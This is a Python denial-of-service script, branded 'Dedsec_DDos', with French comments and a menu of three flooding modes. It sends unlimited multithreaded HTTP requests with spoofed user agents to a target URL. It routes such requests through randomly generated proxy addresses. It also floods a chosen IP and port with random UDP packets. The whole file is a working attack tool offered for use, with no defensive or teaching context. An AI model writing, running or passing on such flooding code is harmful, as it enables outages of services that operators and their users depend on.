# -*- coding: utf-8 -*-

import os
import time
import socket
import threading
import random
import urllib.request
from colorama import init, Fore
from pyfiglet import Figlet
from user_agent import generate_user_agent
from urllib.request import ProxyHandler, build_opener

# Initialiser les couleurs
init(autoreset=True)
colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]

# Animation ASCII
def animate_ascii(text, duration=3):
    start_time = time.time()
    while time.time() - start_time < duration:
        for color in colors:
            os.system('clear' if os.name != 'nt' else 'cls')
            print(color + text)
            time.sleep(0.1)

ascii_text = Figlet(font='slant').renderText('Dedsec_DDos')
animate_ascii(ascii_text)

F = Fore.GREEN
Z = Fore.RED
S = Fore.YELLOW

# Mode 1: Attaque HTTP classique
def attack_http(url):
    while True:
        headers = {'User-Agent': generate_user_agent()}
        try:
            req = urllib.request.urlopen(urllib.request.Request(url, headers=headers))
            if req.status == 200:
                print(f'{F}[HTTP] Attack OK: {url}')
            else:
                print(f'{Z}[HTTP] Fail: {url}')
        except:
            print(f'{S}[HTTP] DOWN: {url}')

# Mode 2: Attaque via Proxy
def attack_proxy(url):
    while True:
        ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
        port = random.choice([80, 443, 8080])
        proxy = f"{ip}:{port}"
        headers = {'User-Agent': generate_user_agent()}
        try:
            proxy_handler = ProxyHandler({'http': f'http://{proxy}'})
            opener = build_opener(proxy_handler)
            req = opener.open(urllib.request.Request(url, headers=headers))
            if req.status == 200:
                print(f'{F}[PROXY] OK: {url} | Proxy: {proxy}')
            else:
                print(f'{Z}[PROXY] Fail: {url} | Proxy: {proxy}')
        except:
            print(f'{S}[PROXY] DOWN: {url} | Proxy: {proxy}')

# Mode 3: Attaque UDP
def attack_udp(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1024)
    while True:
        try:
            sock.sendto(bytes_data, (ip, port))
            print(f'{F}[UDP] Frappe sur {ip}:{port}')
        except:
            print(f'{Z}[UDP] DOWN: {ip}:{port}')

# Menu principal
def main_menu():
    print(f"""{Fore.CYAN}
+----------------------------------------+
|           BY:Mr_Chrxs - MENU           |
+----------------------------------------+
|             [1] Attaque HTTP           |
|             [2] Attaque via            |
|             [3] Attaque UDP            |
+----------------------------------------+
""")
    choice = input("Choix (1/2/3): ")

    if choice in ['1', '2']:
        url = input("Cible URL/IP (ex: http://example.com): ")
        threads = int(input("Nombre de threads: "))
        for _ in range(threads):
            if choice == '1':
                threading.Thread(target=attack_http, args=(url,)).start()
            elif choice == '2':
                threading.Thread(target=attack_proxy, args=(url,)).start()
    elif choice == '3':
        ip = input("Adresse IP cible : ")
        port = int(input("Port (ex: 80, 443) : "))
        threads = int(input("Nombre de threads: "))
        for _ in range(threads):
            threading.Thread(target=attack_udp, args=(ip, port)).start()
    else:
        print(f"{Fore.RED}Choix invalide !")

# Lancer le script
main_menu()